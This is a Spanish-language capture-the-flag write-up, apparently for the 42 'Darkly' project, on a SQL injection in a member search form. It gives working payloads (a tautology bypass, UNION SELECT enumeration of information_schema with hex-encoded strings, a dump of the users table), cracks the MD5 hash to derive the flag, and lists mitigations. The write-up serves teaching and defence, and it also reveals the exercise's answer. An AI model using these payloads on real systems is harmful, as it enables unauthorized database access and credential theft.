# A1 - SQL Injection (I)

Vulnerabilidad del OWASP Top 10 (2017). Se encuentra en el formulario de búsqueda de miembros (`members`), donde la entrada del usuario se inyecta directamente en la consulta SQL.

---

## Pasos para obtener la flag

### 1. Confirmar la vulnerabilidad (Bypass por tautología)

Ingresar en el campo de búsqueda:
```
1 or 1
```
La consulta resultante devuelve todos los registros de la tabla. Se observan cuatro usuarios; el último tiene de apellido `getThe` y de nombre `flag`, lo que confirma la vulnerabilidad.

---

### 2. Enumerar la estructura de la base de datos (UNION)

La consulta original selecciona **dos columnas**, por lo que todo `UNION SELECT` debe respetar ese número. Además, las comillas están filtradas, por lo que los strings se pasan en **hexadecimal**.

**Listar tablas:**
```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()
```
Resultado relevante: tabla `users`.

**Listar columnas de `users`** (`users` en hex = `0x7573657273`):
```sql
1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273
```
Columnas de interés: `commentaire` y `countersign`.

---

### 3. Extraer los datos y obtener la flag

```sql
1 UNION SELECT commentaire, countersign FROM users
```

Respuesta:
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname:    5ff9d0165b4f92b14994e5c685cdce28
```

**Proceso:**
1. El hash `5ff9d0165b4f92b14994e5c685cdce28` es MD5 → descifra a `FortyTwo`
2. Pasar a minúsculas → `fortytwo`
3. Aplicar SHA-256 → resultado es la **flag**

> Herramienta recomendada: [CyberChef](https://gchq.github.io/CyberChef/)

---

## Impacto

- **Confidencialidad:** acceso a cualquier dato de la base de datos sin credenciales.
- **Enumeración:** posibilidad de reconstruir toda la estructura interna de la BD.

---

## Mitigación

1. **Consultas preparadas (parametrizadas):** la defensa más efectiva; el input se trata siempre como dato literal.
2. **Validación de entradas:** listas blancas para filtrar caracteres no permitidos.
3. **Principio de mínimo privilegio:** el usuario de BD solo accede a lo estrictamente necesario.
